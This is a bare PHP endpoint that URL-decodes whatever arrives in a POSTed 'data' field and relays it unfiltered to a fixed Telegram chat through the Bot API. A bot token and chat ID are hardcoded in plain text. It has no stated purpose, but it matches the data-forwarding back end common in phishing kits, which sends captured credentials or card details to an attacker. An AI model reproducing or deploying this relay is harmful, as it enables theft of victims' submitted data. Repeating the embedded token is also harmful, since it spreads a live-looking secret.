<?php 

if(isset($_POST['data'])){
    
$data = urldecode($_POST['data']);
$botToken = "6563990775:AAF5tXFgWc_sj_uD2NcJ2YDO4GDFIVfYYIw";
$chat_id = "1417235718";
$message = $data;
$bot_url    = "https://api.telegram.org/bot6563990775:AAF5tXFgWc_sj_uD2NcJ2YDO4GDFIVfYYIw/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);
}

?>